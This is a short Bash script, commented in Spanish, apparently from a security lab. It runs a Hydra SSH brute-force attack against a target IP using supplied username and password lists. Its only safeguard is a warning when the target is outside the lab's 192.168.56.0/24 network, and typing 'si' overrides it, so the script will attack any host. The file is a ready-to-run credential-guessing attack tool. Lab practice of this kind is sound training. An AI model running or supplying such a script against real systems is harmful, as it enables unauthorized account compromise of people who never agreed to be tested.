#!/usr/bin/env bash
# Simula un ataque de fuerza bruta SSH contra el host víctima del lab con Hydra.
# Uso: ./ssh_bruteforce.sh <ip_victima> <archivo_usuarios> <archivo_passwords>
#
# Este script SOLO debe apuntarse a la IP host-only de la VM víctima propia del lab
# (por defecto 192.168.56.0/24). No usar contra sistemas que no te pertenezcan.

set -euo pipefail

TARGET="${1:?Uso: $0 <ip_victima> <usuarios.txt> <passwords.txt>}"
USERLIST="${2:?Falta archivo de usuarios}"
PASSLIST="${3:?Falta archivo de passwords}"

if [[ "$TARGET" != 192.168.56.* ]]; then
  echo "Aviso: la IP objetivo ($TARGET) no pertenece a la red host-only del lab (192.168.56.0/24)." >&2
  read -rp "¿Continuar de todos modos? (escribe 'si' para confirmar) " confirm
  [[ "$confirm" == "si" ]] || { echo "Cancelado."; exit 1; }
fi

echo "[*] Lanzando fuerza bruta SSH contra $TARGET"
hydra -L "$USERLIST" -P "$PASSLIST" -t 4 -f "ssh://$TARGET"
